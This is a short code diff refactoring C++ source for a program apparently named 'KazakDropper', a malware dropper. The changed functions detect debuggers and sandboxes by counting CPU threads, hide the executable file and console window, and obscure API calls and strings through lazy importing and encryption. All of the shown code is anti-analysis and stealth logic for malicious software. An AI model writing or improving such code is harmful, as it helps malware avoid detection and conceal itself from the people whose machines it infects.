@@ -28,7 +28,7 @@ BOOL KazakDropper::IsBp(const char* lpszModule, const char* lpszFunction)
 	return FALSE;
 }
 
-bool EvadeAnalysis()
+bool KazakDropper::EvadeAnalysis()
 {
 	int iNumberOfThreads = std::thread::hardware_concurrency();
 
@@ -49,7 +49,7 @@ bool EvadeAnalysis()
 
 }
 
-void Stealth()
+void KazakDropper::Stealth()
 {
 	li(SetFileAttributesA)(enc("Kazak.exe"), FILE_ATTRIBUTE_HIDDEN);
 	li(ShowWindow)(GetConsoleWindow(), SW_HIDE);
@@ -63,17 +63,19 @@ void Stealth()
 	std::this_thread::sleep_for(std::chrono::seconds(5));
 }
 
+
+
 int main()
 {
-	while (!EvadeAnalysis())
+	while (!KazakDropper::EvadeAnalysis())
 	{
 		KazakDropper::Stealth();
 
 
 	}
 
-	if (EvadeAnalysis())
-		return;
+	if (KazakDropper::EvadeAnalysis())
+		return 0;
 
 	return 0;
 
